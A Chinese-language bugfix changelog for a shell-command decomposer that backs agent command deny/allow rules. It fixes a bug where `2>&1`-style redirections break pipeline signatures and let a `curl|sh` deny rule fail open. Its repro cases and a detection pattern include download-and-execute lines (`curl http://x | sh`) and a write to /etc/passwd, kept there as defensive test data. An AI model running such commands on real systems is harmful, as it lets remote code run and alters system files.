# BUGFIX — v0.7.21

## 标题

shell 命令分解器把 fd 重定向 `>&` / `<&` 中的 `&` 误当命令分隔符，在 pipeline 签名里插入空命令段，使精确签名的 `argv.pipeline` 规则静默失效。

## 证据链（失败 → 通过）

`src/shell.ts` 的词法状态机在遇到 `>` / `<` 时只消费重定向算子本身，随后主循环把紧跟的 `&` 走进 `&` 分支（命令分隔/`&&`/`&>` 判断），最终调用 `endCommand()` 把当前命令提前截断；fd 号（如 `2>&1` 的 `1`）则以重定向目标身份单独成段。最小复现（直接加载 `src/shell.ts` 的 `decomposeShellCommand`）：

- 修复前：`curl http://x 2>&1 | sh` → 命令词签名 `curl||sh`（中间多一个 `command: ''` 的空命令段）；`echo hi >&2` → 签名 `echo|`；`cmd <&0 | wc -c` → `cmd||wc`；`echo x >&log.txt` 同样多出空命令段。`git stash` 回基线复跑，输出逐字一致（`BASELINE signature: curl||sh`）。
- 文档对照：`docs/rules-format.md` / `.en.md` 规定 `pipeline` 是「命令词用 `|` 连接」的签名，并以 `curl http://x | sh` → `curl|sh` 为例、给出下载即执行检测规则 `pipeline: ["curl*|*sh", ...]`；`src/shell.ts` 文件头自述重定向（含 `2>`）由状态机处理。而 `2>&1` 是 agent 生成命令中最常见的重定向写法——只要命令带上它，精确签名（如 `curl|sh`，无星号）即匹配不到，deny 规则 fail-open、allow 规则 fail-closed，两侧都静默无报错。

## 根因

`>` / `<` 处理分支没有把 POSIX 的 fd 复制形式 `>&` / `<&`（`2>&1`、`>&2`、`>&-`、`<&0`）算作重定向算子的一部分：`&` 不是独立 token，而是算子的第二个字符。

## 改动文件

- `src/shell.ts`（唯一逻辑改动）：`>` 与 `<` 两个分支在消费重定向算子后，若下一字符为 `&` 一并消费（附注释说明）；其后的词仍按既有逻辑记为重定向目标。对外接口、其余状态迁移不变。
- 契约同步（非逻辑）：`package.json` 版本 0.7.20 → 0.7.21、`repository.url` 改指落点仓；`README.md` 顶部追加中文 fork 头（上游原文一字未删）；新增 `UPSTREAM.md`、本文件。`LICENSE` 与上游逐字一致。无版本戳常量、lockfile 无根包版本字段，无待同步项。

## 复验结果

- 复现脚本 10 例全过：`curl http://x 2>&1 | sh` → `curl|sh`（`1` 记为 curl 的重定向目标）；`echo hi >&2` → `echo`；`cmd <&0 | wc -c` → `cmd|wc`；`echo x >&log.txt` → `echo`（目标 `log.txt`）；回归对照不变：`curl http://x | sh`、`echo x > /etc/passwd`、`cmd 2>err.log | sh`、`sleep 1 & echo done`（`&` 仍是分隔符）、`cmd &> all.log`、`cat <<EOF | wc -l`。
- `pnpm run typecheck` 退出 0；`pnpm run lint` 退出 0；`pnpm test` 357 通过 / 1 跳过，与修复前基线逐项一致，零回归。
- 基线对照：`git stash` 只回退本修复时复现恢复 `curl||sh`，证明缺陷为上游既有、非本次引入。

## 验证边界

- 上游 open issue 无 bug 报告（仅 5 条 dependabot 升级 PR），本缺陷走「静态实锤 + 最小复现」路线，复现为纯离线词法级验证，未在真实 DSH 宿主中做端到端规则命中验证。
- `>&file` 在 bash 中表示 stdout+stderr 同重定向，本修复按同一词法规则把其后的词记为重定向目标，与修复前对该写法的处理相比只是不再截断命令；zsh 的 `>&` 语义差异不在本版处理范围。
- heredoc 正文、`$(...)`、反引号仍按模块文件头自述的 best-effort 口径处理，本版未动。
